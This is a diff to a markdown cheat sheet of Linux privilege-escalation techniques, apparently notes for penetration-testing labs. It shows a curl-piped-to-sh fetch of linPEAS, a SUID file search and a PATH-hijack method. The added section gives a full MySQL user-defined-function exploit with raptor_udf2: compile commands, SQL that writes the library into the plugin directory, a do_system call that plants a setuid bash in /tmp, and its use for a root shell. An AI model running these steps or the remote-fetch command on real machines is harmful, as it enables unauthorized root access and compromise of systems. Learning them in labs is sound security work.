@@ -16,6 +16,7 @@ first ssh into ip THEN
 curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
 ```
 
+
 ## LinEnum
 
 [LinEnum GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
@@ -58,7 +59,9 @@ ctrl+F to find this part of your LinEnum scan
 ```
 OR
 Use this command to search the system for SUID/GUID files:
-`find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 
 
 
@@ -121,6 +124,33 @@ view the Path of the relevant user `echo $PATH`
 `export PATH=/tmp:$PATH`
 4. run the script and you should have root
 5. Once you’ve finished the exploit, you can exit out of root and use `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH` to reset the PATH variable back to default, letting you use `ls` again
+
+
+
+## Exploit Services 
+
+If MySQL service is running as root and the "root" user for the service does not have a password assigned We can use [raptor_udf2.c,v 1.1](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
+
+Compiles exploit
+```
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root
+```
+Uses MYSQL to create a bash executable in the /tmp/ directory
+```
+use mysql;   
+create table foo(line blob);   
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));   select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   
+create function do_system returns integer soname 'raptor_udf2.so';`
+
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+Exit out of the MYSQL shelll using `exit` then run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+```
+/tmp/rootbash -p
+```
+
 
 
 
